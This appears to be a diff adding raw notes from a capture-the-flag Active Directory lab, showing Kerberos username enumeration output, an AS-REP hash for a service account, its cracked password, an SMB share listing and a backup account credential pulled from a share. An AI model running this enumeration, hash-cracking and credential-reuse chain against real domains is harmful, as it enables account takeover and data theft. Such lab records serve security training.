@@ -1,0 +1,50 @@
+kerberos enu
+    __             __               __     
+users:
+2021/08/16 22:30:34 >  [+] VALID USERNAME:	 james@THM-AD
+2021/08/16 22:30:36 >  [+] VALID USERNAME:	 svc-admin@THM-AD
+2021/08/16 22:30:39 >  [+] VALID USERNAME:	 James@THM-AD
+2021/08/16 22:30:40 >  [+] VALID USERNAME:	 robin@THM-AD
+2021/08/16 22:30:47 >  [+] VALID USERNAME:	 darkstar@THM-AD
+2021/08/16 22:30:51 >  [+] VALID USERNAME:	 administrator@THM-AD
+2021/08/16 22:31:00 >  [+] VALID USERNAME:	 backup@THM-AD
+2021/08/16 22:31:08 >  [+] VALID USERNAME:	 paradox@THM-AD
+2021/08/16 22:31:47 >  [+] VALID USERNAME:	 JAMES@THM-AD
+2021/08/16 22:31:57 >  [+] VALID USERNAME:	 Robin@THM-AD
+2021/08/16 22:33:23 >  [+] VALID USERNAME:	 Administrator@THM-AD
+2021/08/16 22:35:21 >  [+] VALID USERNAME:	 Darkstar@THM-AD
+2021/08/16 22:35:52 >  [+] VALID USERNAME:	 Paradox@THM-AD
+2021/08/16 22:38:25 >  [+] VALID USERNAME:	 DARKSTAR@THM-AD
+2021/08/16 22:39:00 >  [+] VALID USERNAME:	 ori@THM-AD
+2021/08/16 22:40:01 >  [+] VALID USERNAME:	 ROBIN@THM-AD
+
+
+kerberos tgt hash 
+$krb5asrep$23$svc-admin@THM-AD:d869f0a67db2104d1e6393ac53a012b4$c98bed7ea3a8e8162a02a69a08145eb2111584634d7aa2834056462a38c5c7a8183d3bd630fb7e566c5d961205772980e70f1ab70e23ea51306468492e88af2288e69ec6440619baf6f0ec4d11111135af0868a23a89f2246c197ac0df05712cd8508955f8f54ded6bf46e1a8f45682778eca2546b3afe96076dd6dfa754278dd8db27450d4993e14ebbddba31d3ba3ca2bb4b5594d8c44705e2c27b299ab6b1a86e8cfb85f9989ac1d7f5671ca1b08986d885d497574580b3ded5ad5e2d67554aeeb35757e066942137f4e1bb26a8203cf6572c44356b929ee6d52092a2e80e59a452246b3281c5c1
+
+password:
+svc-admin=management2005
+
+
+smb shares using credentials founded:
+Enter WORKGROUP\svc-admin's password: 
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	backup          Disk      
+	C$              Disk      Default share
+	IPC$            IPC       Remote IPC
+	NETLOGON        Disk      Logon server share 
+	SYSVOL          Disk      Logon server share
+
+backup file content:
+	backup@spookysec.local:backup2517860 
+
+
+
+
+
+
+
+
